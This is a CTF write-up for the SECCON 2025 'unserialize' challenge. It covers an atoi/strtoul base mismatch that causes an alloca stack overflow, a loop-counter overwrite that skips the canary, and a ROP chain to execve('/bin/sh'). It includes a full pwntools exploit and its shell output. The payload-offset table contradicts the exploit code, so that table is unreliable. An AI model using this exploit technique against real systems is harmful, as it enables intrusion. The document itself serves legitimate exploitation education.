# SECCON 2025 - unserialize Challenge Writeup

## Challenge Overview

**Challenge Name:** unserialize  
**Category:** Binary Exploitation  
**Difficulty:** Hard  
**Flag:** `SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}`

### Files Provided
- `chall` - Statically linked x64 ELF binary
- `main.c` - Source code
- `Dockerfile` - Container setup

### Security Mitigations
```bash
$ checksec --file=chall
RELRO:        Partial RELRO
STACK CANARY: Canary found
NX:           NX enabled
PIE:          No PIE (0x400000)
```

---

## Understanding the Program

### The main() Function

```c
int main() {
  char buf[0x100];  // 256 bytes on stack
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  if (unserialize(stdin, buf, sizeof(buf)) < 0) {
    puts("[-] Deserialization faield");
  } else {
    puts("[+] Deserialization success");
  }
  
  return 0;
}
```

The main function creates a 256-byte buffer and calls `unserialize()` to read and process input.

### The unserialize() Function

```c
ssize_t unserialize(FILE *fp, char *buf, size_t size) {
  char szbuf[0x20];
  char *tmpbuf;

  // Read size string until ':'
  for (size_t i = 0; i < sizeof(szbuf); i++) {
    szbuf[i] = fgetc(fp);
    if (szbuf[i] == ':') {
      szbuf[i] = 0;
      break;
    }
    if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) {
      return -1;
    }
  }

  // Validation: atoi() with decimal interpretation
  if (atoi(szbuf) > size) {
    return -1;
  }

  // VULNERABILITY: strtoul() with base 0 (auto-detect)
  tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0));

  // Read data: strtoul() with base 10 (decimal)
  size_t sz = strtoul(szbuf, NULL, 10);
  for (size_t i = 0; i < sz; i++) {
    if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) {
      return -1;
    }
  }

  memcpy(buf, tmpbuf, sz);
  return sz;
}
```

---

## The Vulnerability: Integer Parsing Discrepancy

### Understanding the Three Parsing Functions

The bug exists because the same input string is parsed THREE different ways:

1. **atoi()** - Always interprets as decimal
2. **strtoul(str, NULL, 0)** - Auto-detects base (octal if starts with '0')
3. **strtoul(str, NULL, 10)** - Forces decimal interpretation

### Example with Input "0199:"

| Function | Input | Base Detected | Result | Explanation |
|----------|-------|---------------|--------|-------------|
| `atoi("0199")` | "0199" | Decimal (always) | **199** | Passes check (199 ≤ 256) |
| `strtoul("0199", NULL, 0)` | "0199" | Octal (starts with '0') | **1** | Stops at '9' (invalid in octal), parses "01" = 1 |
| `strtoul("0199", NULL, 10)` | "0199" | Decimal (forced) | **199** | Full string parsed |

### Why This Causes Overflow

```c
// Check passes: 199 ≤ 256
if (atoi("0199") > size) { ... }  // 199 > 256? NO

// Allocate only 1 byte (rounded to 16 for alignment)
tmpbuf = alloca(strtoul("0199", NULL, 0));  // alloca(1) → 16 bytes

// But read 199 bytes!
size_t sz = strtoul("0199", NULL, 10);  // sz = 199
for (size_t i = 0; i < 199; i++) {
    fscanf(fp, "%02hhx", tmpbuf + i);  // Writes 199 bytes into 16-byte buffer
}
```

**Result:** Allocate 16 bytes, write 199 bytes → **183 bytes of overflow!**

---

## Common Confusions Clarified

### Q1: "I thought sz only stores 10 bytes?"

**Answer:** No! `sz` is a variable that holds a NUMBER (the count), not a buffer.

```c
size_t sz = 199;  // sz is a number: "how many bytes to read"
```

It tells the loop to run 199 iterations, reading 199 bytes of data.

### Q2: "How can tmpbuf[56] be the j variable? We only allocated 16 bytes!"

**Answer:** This is the overflow! When you write past the end of an array, you overwrite adjacent memory.

```
Memory Layout After alloca(16):

Address         | Content           | Name
----------------+-------------------+------------------
0x7fffffffd840  | [allocated]       | tmpbuf[0]
0x7fffffffd841  | [allocated]       | tmpbuf[1]
...
0x7fffffffd84f  | [allocated]       | tmpbuf[15] ← End of allocation
0x7fffffffd850  | [OVERFLOW ZONE]   | tmpbuf[16] ← Writing here is overflow!
...
0x7fffffffd878  | j variable        | tmpbuf[56] ← Overwrites loop counter!
...
0x7fffffffd8c8  | return address    | tmpbuf[136] ← Target for ROP
```

Distance from tmpbuf to j: `0x878 - 0x840 = 0x38 = 56 bytes`

### Q3: "Why set j to 0x87 (135)?"

**Answer:** To skip past the canary and write directly to the return address.

After we set `j=135`:
- Next iteration writes to `tmpbuf[135]`
- Continue to `tmpbuf[136]` which equals the return address
- This lets us write our ROP chain without touching the canary (at offset ~120)

### Q4: "What does 'restore fp and buf' mean?"

**Answer:** When we overflow, we corrupt local variables stored on the stack:
- `fp` (FILE pointer to stdin) at `[rbp-0x58]`
- `buf` (destination pointer) at `[rbp-0x60]`

If we don't restore these, the program crashes before our exploit executes:
- Corrupted `fp` → `fscanf(fp, ...)` crashes
- Corrupted `buf` → We can't control where `memcpy` writes

By restoring them to valid values, the loop continues running until it reaches the return address.

---

## Dynamic Analysis: Finding Offsets in GDB

### Step 1: Basic Crash Test

```bash
# Test normal operation
echo -n "10:0102030405060708090a" | ./chall
# Output: [+] Deserialization success

# Test overflow with octal
python3 -c "print('0100:' + '41' * 100)" | ./chall
# Output: Segmentation fault
```

### Step 2: Debugging in pwndbg

Create input file:
```bash
python3 -c "print('0199:' + '41'*199)" > /tmp/test
```

Start debugging session:
```bash
pwndbg chall
pwndbg> break *unserialize+416  # Start of fscanf loop
pwndbg> run < /tmp/test
```

When breakpoint hits, examine the stack:
```
pwndbg> p/x $rbp-0x48
$1 = 0x7fffffffd878  # Address of j variable

pwndbg> p/x *(char**)($rbp-0x40)
$2 = 0x7fffffffd840  # Address of tmpbuf

pwndbg> p/x $rbp+8
$3 = 0x7fffffffd8c8  # Address of return address
```

Calculate offsets:
```python
j_offset = 0x878 - 0x840 = 0x38 = 56 bytes
ret_offset = 0x8c8 - 0x840 = 0x88 = 136 bytes
```

### Step 3: Verify fp and buf Locations

```bash
pwndbg> p/x *(char**)($rbp-0x58)
$4 = 0x4ca440  # stdin address (fp)

pwndbg> p/x *(char**)($rbp-0x60)
$5 = 0x7fffffffd8d0  # Stack address (buf - changes each run)
```

Find stdin in binary:
```bash
$ readelf -s chall | grep stdin
1081: 00000000004ca440   224 OBJECT  GLOBAL DEFAULT   20 _IO_2_1_stdin_
```

---

## Exploitation Strategy

### The Loop Hijacking Technique

Instead of trying to bypass the canary, we hijack the loop counter to skip over it:

1. Write 56 bytes to reach the `j` variable
2. Overwrite `j` with `0x87` (135 decimal)
3. Loop continues from iteration 135, skipping the canary region
4. Iteration 136 writes to the return address
5. Remaining iterations (137-198) write our ROP chain

### Memory Layout During Exploitation

```
Byte Offset | What Gets Written        | Purpose
------------+--------------------------+-----------------------------------
0-7         | b"/bin/sh\0"             | String for execve
8-23        | b"A" * 24                | Padding
24-31       | p64(0x4ca8d0)            | Restore buf → points to BSS
32-39       | p64(0x4ca440)            | Restore fp → stdin pointer
40-55       | b"B" * 16                | Padding
56          | 0x87                     | Overwrite j=135 (hijack loop!)
57-135      | (loop skips these)       | Skipped iterations
136+        | ROP chain                | Written when j=136, 137, etc.
```

### Why Write /bin/sh to BSS?

The payload starts with `/bin/sh\0`, which gets written to `tmpbuf[0-7]`. Then:

1. We overwrote `buf` to point to BSS (0x4ca8d0) instead of stack
2. `memcpy(buf, tmpbuf, sz)` copies our `/bin/sh` to BSS
3. BSS is at a fixed address (No PIE), so we can use it in ROP
4. Our ROP chain uses `0x4ca8d0` as the argument to execve

Finding writable regions:
```bash
$ readelf -S chall | grep -E '\.bss|\.data'
[20] .data    PROGBITS  00000000004ca000  000c9000  ... WA
[21] .bss     NOBITS    00000000004cba00  000caa00  ... WA
```

Any address in these ranges works. `0x4ca8d0` is arbitrary (0x4ca000 + 0x8d0).

---

## Building the ROP Chain

### Finding Gadgets

```bash
ROPgadget --binary chall | grep "pop rdi"
ROPgadget --binary chall | grep "pop rsi"
ROPgadget --binary chall | grep "pop rax"
ROPgadget --binary chall | grep "syscall"
```

Selected gadgets:
```
0x402418 : pop rdi ; pop rbp ; ret
0x43617e : pop rsi ; ret
0x4303ab : pop rax ; ret
0x401364 : syscall
```

### Understanding the ROP Chain

**Goal:** Execute `execve("/bin/sh", NULL, NULL)`

Linux x64 syscall convention:
- `rax` = syscall number (59 = 0x3b for execve)
- `rdi` = 1st argument (pathname)
- `rsi` = 2nd argument (argv array)
- `rdx` = 3rd argument (envp array, we ignore this)

```python
rop = flat(
    POP_RDI, 0x4ca8d0,  # rdi = pointer to "/bin/sh" in BSS
    0,                   # dummy value for pop rbp
    POP_RSI, 0,         # rsi = NULL
    POP_RAX, 0x3b,      # rax = 59 (execve)
    SYSCALL             # invoke syscall
)
```

**Execution flow:**
1. Function returns → jumps to POP_RDI
2. Pops 0x4ca8d0 into rdi (pathname = "/bin/sh")
3. Pops 0 into rbp (dummy for the extra pop)
4. Returns to POP_RSI
5. Pops 0 into rsi (argv = NULL)
6. Returns to POP_RAX
7. Pops 0x3b into rax (syscall number)
8. Returns to SYSCALL
9. Kernel executes `execve("/bin/sh", NULL, <ignored>)` → spawns shell!

### Why the Dummy rbp Value?

The `pop rdi` gadget is `pop rdi; pop rbp; ret`, which pops TWO values from the stack. We provide a dummy value (0) so the gadget works correctly:

```
Stack before POP_RDI:
[0x4ca8d0]  ← RSP (popped into rdi)
[0x000000]  ← popped into rbp (dummy)
[POP_RSI]   ← Return address
```

---

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
context.binary = exe

# Connect to challenge
r = remote("unserialize.seccon.games", 5000)
# r = process([exe.path])  # For local testing

# Send the size header
r.send(b"0199:")
sleep(0.3)

# ROP gadgets
POP_RDI = 0x402418  # pop rdi; pop rbp; ret
POP_RSI = 0x43617e  # pop rsi; ret
POP_RAX = 0x4303ab  # pop rax; ret
SYSCALL = 0x401364  # syscall

# Build ROP chain for execve("/bin/sh", NULL, NULL)
rop = flat(
    POP_RDI, 0x4ca8d0,  # rdi = address of "/bin/sh" in BSS
    0,                   # dummy for pop rbp
    POP_RSI, 0,         # rsi = NULL
    POP_RAX, 0x3b,      # rax = 59 (execve syscall)
    SYSCALL
)

# Build overflow payload
payload = b"/bin/sh\0"      # Bytes 0-7: String for execve
payload += b"A" * 0x18      # Bytes 8-31: Padding (24 bytes)
payload += p64(0x4ca8d0)    # Bytes 32-39: Restore buf (BSS address)
payload += p64(0x4ca440)    # Bytes 40-47: Restore fp (stdin)
payload += b"B" * 8         # Bytes 48-55: Padding
payload += p8(0x87)         # Byte 56: Set j=135 (loop hijack!)
payload += rop              # Bytes 57+: ROP chain

# Pad to full size
payload = payload.ljust(0x200, b"\x00")

# Send each byte as two hex characters
for byte in payload:
    r.sendline(f"{byte:02x}".encode())

r.interactive()
```

### Running the Exploit

```bash
$ python3 exploit.py
[*] Opening connection to unserialize.seccon.games on port 5000
[*] Switching to interactive mode
$ ls
flag-fb244ac94827d8b6665d5ac8fc9e25fe.txt
run
$ cat flag-fb244ac94827d8b6665d5ac8fc9e25fe.txt
SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}
```

---

## Why You See "00: not found" Spam

The payload is 512 bytes (0x200). After the shell spawns from your ROP chain, the remaining bytes continue to be sent as input to the shell. Each `"00"` line is interpreted as a shell command:

```bash
$ 00
00: not found
$ 00
00: not found
```

This continues until all 512 bytes are consumed. The shell works fine - just ignore the spam!

---

## Key Takeaways

### 1. Number Parsing Functions Behave Differently

Always check how different parsing functions interpret the same input:
- `atoi()` is always decimal
- `strtoul()` with base 0 auto-detects (0 prefix = octal, 0x = hex)
- Different bases can create integer discrepancies

### 2. alloca() Allocates on the Stack

Unlike malloc(), alloca() places the buffer directly on the function's stack frame:
- Adjacent to local variables
- Overflow can corrupt function state
- No heap metadata to worry about

### 3. Loop Counter Hijacking

When the loop counter is on the stack, you can:
- Overwrite it mid-loop
- Skip iterations (like skipping the canary)
- Control where subsequent writes go

### 4. Stack Variable Restoration

When overflowing, preserve critical pointers:
- FILE pointers (fp) for continued I/O
- Destination pointers for controlled writes
- Check IDA/Ghidra decompilation for variable offsets

### 5. No PIE = Fixed ROP Targets

Without PIE:
- Gadget addresses never change
- Can use fixed BSS/data addresses
- No need to leak base addresses

---

## References

- [Original Writeup by leo_something](https://leo1.cc/posts/writeups/seccon25-unserialize/)
- [strtoul() man page](https://linux.die.net/man/3/strtoul)
- [Linux x64 Syscall Reference](https://filippo.io/linux-syscall-table/)

---

## Appendix: Debugging Commands Reference

### Finding Offsets
```bash
# Start with breakpoint at loop
pwndbg> break *unserialize+416
pwndbg> run < /tmp/test

# Check key addresses
pwndbg> p/x $rbp-0x48        # j variable
pwndbg> p/x *(char**)($rbp-0x40)  # tmpbuf
pwndbg> p/x $rbp+8           # return address
pwndbg> p/x *(char**)($rbp-0x58)  # fp (stdin)

# Calculate distances
python3 -c "print(hex(0x878 - 0x840))"  # Distance to j
```

### Examining Memory
```bash
# View stack layout
pwndbg> x/40gx $rsp
pwndbg> x/40gx $rbp-0x70

# Watch specific address
pwndbg> watch *(char*)0x7fffffffd878  # Watch j variable
```

### Stepping Through Loop
```bash
# Break at fscanf
pwndbg> break *unserialize+451

# Conditional breakpoint
pwndbg> break *unserialize+451 if *(unsigned long*)($rbp-0x48) == 56
pwndbg> commands
> silent
> printf "At iteration 56! j=%d\n", *(unsigned long*)($rbp-0x48)
> continue
> end
```

### Finding Gadgets
```bash
ROPgadget --binary chall > gadgets.txt
grep "pop rdi" gadgets.txt
grep "pop rsi" gadgets.txt
grep "pop rax" gadgets.txt
grep "syscall" gadgets.txt | grep -v ":" | head -5
```

### Checking Binary Sections
```bash
readelf -S chall | grep -E 'bss|data'
readelf -s chall | grep stdin
objdump -M intel -d chall | grep -A5 "syscall"
```
